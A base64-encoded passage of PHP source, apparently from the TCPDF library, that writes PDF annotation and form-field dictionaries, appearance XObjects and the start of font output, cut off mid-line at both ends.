J29wdCddWydkcyddKSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvRFMgJy4kdGhpcy0+X3RleHRzdHJpbmcoJHBsWydvcHQnXVsnZHMnXSwgJGFubm90X29ial9pZCk7CgkJCQkJCQl9CgkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnY2wnXSkgQU5EIGlzX2FycmF5KCRwbFsnb3B0J11bJ2NsJ10pKSB7CgkJCQkJCQkJJGFubm90cyAuPSAnIC9DTCBbJzsKCQkJCQkJCQlmb3JlYWNoICgkcGxbJ29wdCddWydjbCddIGFzICRjbCkgewoJCQkJCQkJCQkkYW5ub3RzIC49IHNwcmludGYoJyVGICcsICRjbCAqICR0aGlzLT5rKTsKCQkJCQkJCQl9CgkJCQkJCQkJJGFubm90cyAuPSAnXSc7CgkJCQkJCQl9CgkJCQkJCQkkdGZpdCA9IGFycmF5KCdGcmVlVGV4dCcsICdGcmVlVGV4dENhbGxvdXQnLCAnRnJlZVRleHRUeXBlV3JpdGVyJyk7CgkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnaXQnXSkgQU5EIGluX2FycmF5KCRwbFsnb3B0J11bJ2l0J10sICR0Zml0KSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvSVQgLycuJHBsWydvcHQnXVsnaXQnXTsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydyZCddKSBBTkQgaXNfYXJyYXkoJHBsWydvcHQnXVsncmQnXSkpIHsKCQkJCQkJCQkkbCA9ICRwbFsnb3B0J11bJ3JkJ11bMF0gKiAkdGhpcy0+azsKCQkJCQkJCQkkciA9ICRwbFsnb3B0J11bJ3JkJ11bMV0gKiAkdGhpcy0+azsKCQkJCQkJCQkkdCA9ICRwbFsnb3B0J11bJ3JkJ11bMl0gKiAkdGhpcy0+azsKCQkJCQkJCQkkYiA9ICRwbFsnb3B0J11bJ3JkJ11bM10gKiAkdGhpcy0+azsKCQkJCQkJCQkkYW5ub3RzIC49ICcgL1JEIFsnLnNwcmludGYoJyVGICVGICVGICVGJywgJGwsICRyLCAkdCwgJGIpLiddJzsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydsZSddKSBBTkQgaW5fYXJyYXkoJHBsWydvcHQnXVsnbGUnXSwgJGxpbmVlbmRpbmdzKSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvTEUgLycuJHBsWydvcHQnXVsnbGUnXTsKCQkJCQkJCX0KCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJCWNhc2UgJ2xpbmUnOiB7CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCQljYXNlICdzcXVhcmUnOiB7CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCQljYXNlICdjaXJjbGUnOiB7CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCQljYXNlICdwb2x5Z29uJzogewoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQkJY2FzZSAncG9seWxpbmUnOiB7CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCQljYXNlICdoaWdobGlnaHQnOiB7CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCQljYXNlICd1bmRlcmxpbmUnOiB7CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCQljYXNlICdzcXVpZ2dseSc6IHsKCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJCWNhc2UgJ3N0cmlrZW91dCc6IHsKCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJCWNhc2UgJ3N0YW1wJzogewoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQkJY2FzZSAnY2FyZXQnOiB7CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCQljYXNlICdpbmsnOiB7CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCQljYXNlICdwb3B1cCc6IHsKCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJCWNhc2UgJ2ZpbGVhdHRhY2htZW50JzogewoJCQkJCQkJaWYgKCR0aGlzLT5wZGZhX21vZGUgJiYgJHRoaXMtPnBkZmFfdmVyc2lvbiAhPSAzKSB7CgkJCQkJCQkJLy8gZW1iZWRkZWQgZmlsZXMgYXJlIG5vdCBhbGxvd2VkIGluIFBERi9BIG1vZGUgdmVyc2lvbiAxIGFuZCAyCgkJCQkJCQkJYnJlYWs7CgkJCQkJCQl9CgkJCQkJCQlpZiAoIWlzc2V0KCRwbFsnb3B0J11bJ2ZzJ10pKSB7CgkJCQkJCQkJYnJlYWs7CgkJCQkJCQl9CgkJCQkJCQkkZmlsZW5hbWUgPSBiYXNlbmFtZSgkcGxbJ29wdCddWydmcyddKTsKCQkJCQkJCWlmIChpc3NldCgkdGhpcy0+ZW1iZWRkZWRmaWxlc1skZmlsZW5hbWVdWydmJ10pKSB7CgkJCQkJCQkJJGFubm90cyAuPSAnIC9GUyAnLiR0aGlzLT5lbWJlZGRlZGZpbGVzWyRmaWxlbmFtZV1bJ2YnXS4nIDAgUic7CgkJCQkJCQkJJGljb25zYXBwID0gYXJyYXkoJ0dyYXBoJywgJ1BhcGVyY2xpcCcsICdQdXNoUGluJywgJ1RhZycpOwoJCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWyduYW1lJ10pIEFORCBpbl9hcnJheSgkcGxbJ29wdCddWyduYW1lJ10sICRpY29uc2FwcCkpIHsKCQkJCQkJCQkJJGFubm90cyAuPSAnIC9OYW1lIC8nLiRwbFsnb3B0J11bJ25hbWUnXTsKCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkkYW5ub3RzIC49ICcgL05hbWUgL1B1c2hQaW4nOwoJCQkJCQkJCX0KCQkJCQkJCQkvLyBpbmRleCAoemVyby1iYXNlZCkgb2YgdGhlIGFubm90YXRpb24gaW4gdGhlIEFubm90cyBhcnJheSBvZiB0aGlzIHBhZ2UKCQkJCQkJCQkkdGhpcy0+ZW1iZWRkZWRmaWxlc1skZmlsZW5hbWVdWydhJ10gPSAka2V5OwoJCQkJCQkJfQoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQkJY2FzZSAnc291bmQnOiB7CgkJCQkJCQlpZiAoIWlzc2V0KCRwbFsnb3B0J11bJ2ZzJ10pKSB7CgkJCQkJCQkJYnJlYWs7CgkJCQkJCQl9CgkJCQkJCQkkZmlsZW5hbWUgPSBiYXNlbmFtZSgkcGxbJ29wdCddWydmcyddKTsKCQkJCQkJCWlmIChpc3NldCgkdGhpcy0+ZW1iZWRkZWRmaWxlc1skZmlsZW5hbWVdWydmJ10pKSB7CgkJCQkJCQkJLy8gLi4uIFRPIEJFIENPTVBMRVRFRCAuLi4KCQkJCQkJCQkvLyAvUiAvQyAvQiAvRSAvQ08gL0NQCgkJCQkJCQkJJGFubm90cyAuPSAnIC9Tb3VuZCAnLiR0aGlzLT5lbWJlZGRlZGZpbGVzWyRmaWxlbmFtZV1bJ2YnXS4nIDAgUic7CgkJCQkJCQkJJGljb25zYXBwID0gYXJyYXkoJ1NwZWFrZXInLCAnTWljJyk7CgkJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ25hbWUnXSkgQU5EIGluX2FycmF5KCRwbFsnb3B0J11bJ25hbWUnXSwgJGljb25zYXBwKSkgewoJCQkJCQkJCQkkYW5ub3RzIC49ICcgL05hbWUgLycuJHBsWydvcHQnXVsnbmFtZSddOwoJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCSRhbm5vdHMgLj0gJyAvTmFtZSAvU3BlYWtlcic7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQkJY2FzZSAnbW92aWUnOiB7CgkJCQkJCQlicmVhazsKCQkJCQkJfQoJCQkJCQljYXNlICd3aWRnZXQnOiB7CgkJCQkJCQkkaG1vZGUgPSBhcnJheSgnTicsICdJJywgJ08nLCAnUCcsICdUJyk7CgkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnaCddKSBBTkQgaW5fYXJyYXkoJHBsWydvcHQnXVsnaCddLCAkaG1vZGUpKSB7CgkJCQkJCQkJJGFubm90cyAuPSAnIC9IIC8nLiRwbFsnb3B0J11bJ2gnXTsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydtayddKSBBTkQgKGlzX2FycmF5KCRwbFsnb3B0J11bJ21rJ10pKSBBTkQgIWVtcHR5KCRwbFsnb3B0J11bJ21rJ10pKSB7CgkJCQkJCQkJJGFubm90cyAuPSAnIC9NSyA8PCc7CgkJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ21rJ11bJ3InXSkpIHsKCQkJCQkJCQkJJGFubm90cyAuPSAnIC9SICcuJHBsWydvcHQnXVsnbWsnXVsnciddOwoJCQkJCQkJCX0KCQkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnbWsnXVsnYmMnXSkgQU5EIChpc19hcnJheSgkcGxbJ29wdCddWydtayddWydiYyddKSkpIHsKCQkJCQkJCQkJJGFubm90cyAuPSAnIC9CQyAnLlRDUERGX0NPTE9SUzo6Z2V0Q29sb3JTdHJpbmdGcm9tQXJyYXkoJHBsWydvcHQnXVsnbWsnXVsnYmMnXSk7CgkJCQkJCQkJfQoJCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydtayddWydiZyddKSBBTkQgKGlzX2FycmF5KCRwbFsnb3B0J11bJ21rJ11bJ2JnJ10pKSkgewoJCQkJCQkJCQkkYW5ub3RzIC49ICcgL0JHICcuVENQREZfQ09MT1JTOjpnZXRDb2xvclN0cmluZ0Zyb21BcnJheSgkcGxbJ29wdCddWydtayddWydiZyddKTsKCQkJCQkJCQl9CgkJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ21rJ11bJ2NhJ10pKSB7CgkJCQkJCQkJCSRhbm5vdHMgLj0gJyAvQ0EgJy4kcGxbJ29wdCddWydtayddWydjYSddOwoJCQkJCQkJCX0KCQkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnbWsnXVsncmMnXSkpIHsKCQkJCQkJCQkJJGFubm90cyAuPSAnIC9SQyAnLiRwbFsnb3B0J11bJ21rJ11bJ3JjJ107CgkJCQkJCQkJfQoJCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydtayddWydhYyddKSkgewoJCQkJCQkJCQkkYW5ub3RzIC49ICcgL0FDICcuJHBsWydvcHQnXVsnbWsnXVsnYWMnXTsKCQkJCQkJCQl9CgkJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ21rJ11bJ2knXSkpIHsKCQkJCQkJCQkJJGluZm8gPSAkdGhpcy0+Z2V0SW1hZ2VCdWZmZXIoJHBsWydvcHQnXVsnbWsnXVsnaSddKTsKCQkJCQkJCQkJaWYgKCRpbmZvICE9PSBmYWxzZSkgewoJCQkJCQkJCQkJJGFubm90cyAuPSAnIC9JICcuJGluZm9bJ24nXS4nIDAgUic7CgkJCQkJCQkJCX0KCQkJCQkJCQl9CgkJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ21rJ11bJ3JpJ10pKSB7CgkJCQkJCQkJCSRpbmZvID0gJHRoaXMtPmdldEltYWdlQnVmZmVyKCRwbFsnb3B0J11bJ21rJ11bJ3JpJ10pOwoJCQkJCQkJCQlpZiAoJGluZm8gIT09IGZhbHNlKSB7CgkJCQkJCQkJCQkkYW5ub3RzIC49ICcgL1JJICcuJGluZm9bJ24nXS4nIDAgUic7CgkJCQkJCQkJCX0KCQkJCQkJCQl9CgkJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ21rJ11bJ2l4J10pKSB7CgkJCQkJCQkJCSRpbmZvID0gJHRoaXMtPmdldEltYWdlQnVmZmVyKCRwbFsnb3B0J11bJ21rJ11bJ2l4J10pOwoJCQkJCQkJCQlpZiAoJGluZm8gIT09IGZhbHNlKSB7CgkJCQkJCQkJCQkkYW5ub3RzIC49ICcgL0lYICcuJGluZm9bJ24nXS4nIDAgUic7CgkJCQkJCQkJCX0KCQkJCQkJCQl9CgkJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ21rJ11bJ2lmJ10pIEFORCAoaXNfYXJyYXkoJHBsWydvcHQnXVsnbWsnXVsnaWYnXSkpIEFORCAhZW1wdHkoJHBsWydvcHQnXVsnbWsnXVsnaWYnXSkpIHsKCQkJCQkJCQkJJGFubm90cyAuPSAnIC9JRiA8PCc7CgkJCQkJCQkJCSRpZl9zdyA9IGFycmF5KCdBJywgJ0InLCAnUycsICdOJyk7CgkJCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydtayddWydpZiddWydzdyddKSBBTkQgaW5fYXJyYXkoJHBsWydvcHQnXVsnbWsnXVsnaWYnXVsnc3cnXSwgJGlmX3N3KSkgewoJCQkJCQkJCQkJJGFubm90cyAuPSAnIC9TVyAvJy4kcGxbJ29wdCddWydtayddWydpZiddWydzdyddOwoJCQkJCQkJCQl9CgkJCQkJCQkJCSRpZl9zID0gYXJyYXkoJ0EnLCAnUCcpOwoJCQkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnbWsnXVsnaWYnXVsncyddKSBBTkQgaW5fYXJyYXkoJHBsWydvcHQnXVsnbWsnXVsnaWYnXVsncyddLCAkaWZfcykpIHsKCQkJCQkJCQkJCSRhbm5vdHMgLj0gJyAvUyAvJy4kcGxbJ29wdCddWydtayddWydpZiddWydzJ107CgkJCQkJCQkJCX0KCQkJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ21rJ11bJ2lmJ11bJ2EnXSkgQU5EIChpc19hcnJheSgkcGxbJ29wdCddWydtayddWydpZiddWydhJ10pKSBBTkQgIWVtcHR5KCRwbFsnb3B0J11bJ21rJ11bJ2lmJ11bJ2EnXSkpIHsKCQkJCQkJCQkJCSRhbm5vdHMgLj0gc3ByaW50ZignIC9BIFslRiAlRl0nLCAkcGxbJ29wdCddWydtayddWydpZiddWydhJ11bMF0sICRwbFsnb3B0J11bJ21rJ11bJ2lmJ11bJ2EnXVsxXSk7CgkJCQkJCQkJCX0KCQkJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ21rJ11bJ2lmJ11bJ2ZiJ10pIEFORCAoJHBsWydvcHQnXVsnbWsnXVsnaWYnXVsnZmInXSkpIHsKCQkJCQkJCQkJCSRhbm5vdHMgLj0gJyAvRkIgdHJ1ZSc7CgkJCQkJCQkJCX0KCQkJCQkJCQkJJGFubm90cyAuPSAnPj4nOwoJCQkJCQkJCX0KCQkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnbWsnXVsndHAnXSkgQU5EICgkcGxbJ29wdCddWydtayddWyd0cCddID49IDApIEFORCAoJHBsWydvcHQnXVsnbWsnXVsndHAnXSA8PSA2KSkgewoJCQkJCQkJCQkkYW5ub3RzIC49ICcgL1RQICcuaW50dmFsKCRwbFsnb3B0J11bJ21rJ11bJ3RwJ10pOwoJCQkJCQkJCX0KCQkJCQkJCQkkYW5ub3RzIC49ICc+Pic7CgkJCQkJCQl9IC8vIGVuZCBNSwoJCQkJCQkJLy8gLS0tIEVudHJpZXMgZm9yIGZpZWxkIGRpY3Rpb25hcmllcyAtLS0KCQkJCQkJCWlmIChpc3NldCgkdGhpcy0+cmFkaW9idXR0b25fZ3JvdXBzWyRuXVskcGxbJ3R4dCddXSkpIHsKCQkJCQkJCQkvLyBzZXQgcGFyZW50CgkJCQkJCQkJJGFubm90cyAuPSAnIC9QYXJlbnQgJy4kdGhpcy0+cmFkaW9idXR0b25fZ3JvdXBzWyRuXVskcGxbJ3R4dCddXS4nIDAgUic7CgkJCQkJCQl9CgkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsndCddKSBBTkQgaXNfc3RyaW5nKCRwbFsnb3B0J11bJ3QnXSkpIHsKCQkJCQkJCQkkYW5ub3RzIC49ICcgL1QgJy4kdGhpcy0+X2RhdGFzdHJpbmcoJHBsWydvcHQnXVsndCddLCAkYW5ub3Rfb2JqX2lkKTsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWyd0dSddKSBBTkQgaXNfc3RyaW5nKCRwbFsnb3B0J11bJ3R1J10pKSB7CgkJCQkJCQkJJGFubm90cyAuPSAnIC9UVSAnLiR0aGlzLT5fZGF0YXN0cmluZygkcGxbJ29wdCddWyd0dSddLCAkYW5ub3Rfb2JqX2lkKTsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWyd0bSddKSBBTkQgaXNfc3RyaW5nKCRwbFsnb3B0J11bJ3RtJ10pKSB7CgkJCQkJCQkJJGFubm90cyAuPSAnIC9UTSAnLiR0aGlzLT5fZGF0YXN0cmluZygkcGxbJ29wdCddWyd0bSddLCAkYW5ub3Rfb2JqX2lkKTsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydmZiddKSkgewoJCQkJCQkJCWlmIChpc19hcnJheSgkcGxbJ29wdCddWydmZiddKSkgewoJCQkJCQkJCQkvLyBhcnJheSBvZiBiaXQgc2V0dGluZ3MKCQkJCQkJCQkJJGZsYWcgPSAwOwoJCQkJCQkJCQlmb3JlYWNoKCRwbFsnb3B0J11bJ2ZmJ10gYXMgJHZhbCkgewoJCQkJCQkJCQkJJGZsYWcgKz0gMSA8PCAoJHZhbCAtIDEpOwoJCQkJCQkJCQl9CgkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJJGZsYWcgPSBpbnR2YWwoJHBsWydvcHQnXVsnZmYnXSk7CgkJCQkJCQkJfQoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvRmYgJy4kZmxhZzsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydtYXhsZW4nXSkpIHsKCQkJCQkJCQkkYW5ub3RzIC49ICcgL01heExlbiAnLmludHZhbCgkcGxbJ29wdCddWydtYXhsZW4nXSk7CgkJCQkJCQl9CgkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsndiddKSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvVic7CgkJCQkJCQkJaWYgKGlzX2FycmF5KCRwbFsnb3B0J11bJ3YnXSkpIHsKCQkJCQkJCQkJZm9yZWFjaCAoJHBsWydvcHQnXVsndiddIEFTICRvcHR2YWwpIHsKCQkJCQkJCQkJCWlmIChpc19mbG9hdCgkb3B0dmFsKSkgewoJCQkJCQkJCQkJCSRvcHR2YWwgPSBzcHJpbnRmKCclRicsICRvcHR2YWwpOwoJCQkJCQkJCQkJfQoJCQkJCQkJCQkJJGFubm90cyAuPSAnICcuJG9wdHZhbDsKCQkJCQkJCQkJfQoJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCSRhbm5vdHMgLj0gJyAnLiR0aGlzLT5fdGV4dHN0cmluZygkcGxbJ29wdCddWyd2J10sICRhbm5vdF9vYmpfaWQpOwoJCQkJCQkJCX0KCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydkdiddKSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvRFYnOwoJCQkJCQkJCWlmIChpc19hcnJheSgkcGxbJ29wdCddWydkdiddKSkgewoJCQkJCQkJCQlmb3JlYWNoICgkcGxbJ29wdCddWydkdiddIEFTICRvcHR2YWwpIHsKCQkJCQkJCQkJCWlmIChpc19mbG9hdCgkb3B0dmFsKSkgewoJCQkJCQkJCQkJCSRvcHR2YWwgPSBzcHJpbnRmKCclRicsICRvcHR2YWwpOwoJCQkJCQkJCQkJfQoJCQkJCQkJCQkJJGFubm90cyAuPSAnICcuJG9wdHZhbDsKCQkJCQkJCQkJfQoJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCSRhbm5vdHMgLj0gJyAnLiR0aGlzLT5fdGV4dHN0cmluZygkcGxbJ29wdCddWydkdiddLCAkYW5ub3Rfb2JqX2lkKTsKCQkJCQkJCQl9CgkJCQkJCQl9CgkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsncnYnXSkpIHsKCQkJCQkJCQkkYW5ub3RzIC49ICcgL1JWJzsKCQkJCQkJCQlpZiAoaXNfYXJyYXkoJHBsWydvcHQnXVsncnYnXSkpIHsKCQkJCQkJCQkJZm9yZWFjaCAoJHBsWydvcHQnXVsncnYnXSBBUyAkb3B0dmFsKSB7CgkJCQkJCQkJCQlpZiAoaXNfZmxvYXQoJG9wdHZhbCkpIHsKCQkJCQkJCQkJCQkkb3B0dmFsID0gc3ByaW50ZignJUYnLCAkb3B0dmFsKTsKCQkJCQkJCQkJCX0KCQkJCQkJCQkJCSRhbm5vdHMgLj0gJyAnLiRvcHR2YWw7CgkJCQkJCQkJCX0KCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkkYW5ub3RzIC49ICcgJy4kdGhpcy0+X3RleHRzdHJpbmcoJHBsWydvcHQnXVsncnYnXSwgJGFubm90X29ial9pZCk7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ2EnXSkgQU5EICFlbXB0eSgkcGxbJ29wdCddWydhJ10pKSB7CgkJCQkJCQkJJGFubm90cyAuPSAnIC9BIDw8ICcuJHBsWydvcHQnXVsnYSddLicgPj4nOwoJCQkJCQkJfQoJCQkJCQkJaWYgKGlzc2V0KCRwbFsnb3B0J11bJ2FhJ10pIEFORCAhZW1wdHkoJHBsWydvcHQnXVsnYWEnXSkpIHsKCQkJCQkJCQkkYW5ub3RzIC49ICcgL0FBIDw8ICcuJHBsWydvcHQnXVsnYWEnXS4nID4+JzsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydkYSddKSBBTkQgIWVtcHR5KCRwbFsnb3B0J11bJ2RhJ10pKSB7CgkJCQkJCQkJJGFubm90cyAuPSAnIC9EQSAnLiR0aGlzLT5fZGF0YXN0cmluZygkcGxbJ29wdCddWydkYSddKTsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWydxJ10pIEFORCAoJHBsWydvcHQnXVsncSddID49IDApIEFORCAoJHBsWydvcHQnXVsncSddIDw9IDIpKSB7CgkJCQkJCQkJJGFubm90cyAuPSAnIC9RICcuaW50dmFsKCRwbFsnb3B0J11bJ3EnXSk7CgkJCQkJCQl9CgkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnb3B0J10pIEFORCAoaXNfYXJyYXkoJHBsWydvcHQnXVsnb3B0J10pKSBBTkQgIWVtcHR5KCRwbFsnb3B0J11bJ29wdCddKSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvT3B0IFsnOwoJCQkJCQkJCWZvcmVhY2goJHBsWydvcHQnXVsnb3B0J10gQVMgJGNvcHQpIHsKCQkJCQkJCQkJaWYgKGlzX2FycmF5KCRjb3B0KSkgewoJCQkJCQkJCQkJJGFubm90cyAuPSAnIFsnLiR0aGlzLT5fdGV4dHN0cmluZygkY29wdFswXSwgJGFubm90X29ial9pZCkuJyAnLiR0aGlzLT5fdGV4dHN0cmluZygkY29wdFsxXSwgJGFubm90X29ial9pZCkuJ10nOwoJCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkJJGFubm90cyAuPSAnICcuJHRoaXMtPl90ZXh0c3RyaW5nKCRjb3B0LCAkYW5ub3Rfb2JqX2lkKTsKCQkJCQkJCQkJfQoJCQkJCQkJCX0KCQkJCQkJCQkkYW5ub3RzIC49ICddJzsKCQkJCQkJCX0KCQkJCQkJCWlmIChpc3NldCgkcGxbJ29wdCddWyd0aSddKSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvVEkgJy5pbnR2YWwoJHBsWydvcHQnXVsndGknXSk7CgkJCQkJCQl9CgkJCQkJCQlpZiAoaXNzZXQoJHBsWydvcHQnXVsnaSddKSBBTkQgKGlzX2FycmF5KCRwbFsnb3B0J11bJ2knXSkpIEFORCAhZW1wdHkoJHBsWydvcHQnXVsnaSddKSkgewoJCQkJCQkJCSRhbm5vdHMgLj0gJyAvSSBbJzsKCQkJCQkJCQlmb3JlYWNoKCRwbFsnb3B0J11bJ2knXSBBUyAkY29wdCkgewoJCQkJCQkJCQkkYW5ub3RzIC49IGludHZhbCgkY29wdCkuJyAnOwoJCQkJCQkJCX0KCQkJCQkJCQkkYW5ub3RzIC49ICddJzsKCQkJCQkJCX0KCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJCWNhc2UgJ3NjcmVlbic6IHsKCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJCWNhc2UgJ3ByaW50ZXJtYXJrJzogewoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQkJY2FzZSAndHJhcG5ldCc6IHsKCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJCWNhc2UgJ3dhdGVybWFyayc6IHsKCQkJCQkJCWJyZWFrOwoJCQkJCQl9CgkJCQkJCWNhc2UgJzNkJzogewoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQkJZGVmYXVsdDogewoJCQkJCQkJYnJlYWs7CgkJCQkJCX0KCQkJCQl9CgkJCQkJJGFubm90cyAuPSAnPj4nOwoJCQkJCS8vIGNyZWF0ZSBuZXcgYW5ub3RhdGlvbiBvYmplY3QKCQkJCQkkdGhpcy0+X291dCgkdGhpcy0+X2dldG9iaigkYW5ub3Rfb2JqX2lkKS4iXG4iLiRhbm5vdHMuIlxuIi4nZW5kb2JqJyk7CgkJCQkJaWYgKCRmb3JtZmllbGQgQU5EICFpc3NldCgkdGhpcy0+cmFkaW9idXR0b25fZ3JvdXBzWyRuXVskcGxbJ3R4dCddXSkpIHsKCQkJCQkJLy8gc3RvcmUgcmVmZXJlbmNlIG9mIGZvcm0gb2JqZWN0CgkJCQkJCSR0aGlzLT5mb3JtX29ial9pZFtdID0gJGFubm90X29ial9pZDsKCQkJCQl9CgkJCQl9CgkJCX0KCQl9IC8vIGVuZCBmb3IgZWFjaCBwYWdlCgl9CgoJLyoqCgkgKiBQdXQgYXBwZWFyYW5jZSBzdHJlYW1zIFhPYmplY3QgdXNlZCB0byBkZWZpbmUgYW5ub3RhdGlvbidzIGFwcGVhcmFuY2Ugc3RhdGVzLgoJICogQHBhcmFtIGludCAkdyBhbm5vdGF0aW9uIHdpZHRoCgkgKiBAcGFyYW0gaW50ICRoIGFubm90YXRpb24gaGVpZ2h0CgkgKiBAcGFyYW0gc3RyaW5nICRzdHJlYW0gYXBwZWFyYW5jZSBzdHJlYW0KCSAqIEByZXR1cm4gaW50IG9iamVjdCBJRAoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDQuOC4wMDEgKDIwMDktMDktMDkpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfcHV0QVBYT2JqZWN0KCR3PTAsICRoPTAsICRzdHJlYW09JycpIHsKCQkkc3RyZWFtID0gdHJpbSgkc3RyZWFtKTsKCQkkb3V0ID0gJHRoaXMtPl9nZXRvYmooKS4iXG4iOwoJCSR0aGlzLT54b2JqZWN0c1snQVgnLiR0aGlzLT5uXSA9IGFycmF5KCduJyA9PiAkdGhpcy0+bik7CgkJJG91dCAuPSAnPDwnOwoJCSRvdXQgLj0gJyAvVHlwZSAvWE9iamVjdCc7CgkJJG91dCAuPSAnIC9TdWJ0eXBlIC9Gb3JtJzsKCQkkb3V0IC49ICcgL0Zvcm1UeXBlIDEnOwoJCWlmICgkdGhpcy0+Y29tcHJlc3MpIHsKCQkJJHN0cmVhbSA9IGd6Y29tcHJlc3MoJHN0cmVhbSk7CgkJCSRvdXQgLj0gJyAvRmlsdGVyIC9GbGF0ZURlY29kZSc7CgkJfQoJCSRyZWN0ID0gc3ByaW50ZignJUYgJUYnLCAkdywgJGgpOwoJCSRvdXQgLj0gJyAvQkJveCBbMCAwICcuJHJlY3QuJ10nOwoJCSRvdXQgLj0gJyAvTWF0cml4IFsxIDAgMCAxIDAgMF0nOwoJCSRvdXQgLj0gJyAvUmVzb3VyY2VzIDIgMCBSJzsKCQkkc3RyZWFtID0gJHRoaXMtPl9nZXRyYXdzdHJlYW0oJHN0cmVhbSk7CgkJJG91dCAuPSAnIC9MZW5ndGggJy5zdHJsZW4oJHN0cmVhbSk7CgkJJG91dCAuPSAnID4+JzsKCQkkb3V0IC49ICcgc3RyZWFtJy4iXG4iLiRzdHJlYW0uIlxuIi4nZW5kc3RyZWFtJzsKCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJJHRoaXMtPl9vdXQoJG91dCk7CgkJcmV0dXJuICR0aGlzLT5uOwoJfQoKCS8qKgoJICogT3V0cHV0IGZvbnRzLgoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwcm90ZWN0ZWQKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIF9wdXRmb250cygpIHsKCQkkbmYgPSAkdGhpcy0+bjsKCQlmb3JlYWNoICgkdGhpcy0+ZGlmZnMgYXMgJGRpZmYpIHsKCQkJLy9FbmNvZGluZ3MKCQkJJHRoaXMtPl9uZXdvYmooKTsKCQkJJHRoaXMtPl9vdXQoJzw8IC9UeXBlIC9FbmNvZGluZyAvQmFzZUVuY29kaW5nIC9XaW5BbnNpRW5jb2RpbmcgL0RpZmZlcmVuY2VzIFsnLiRka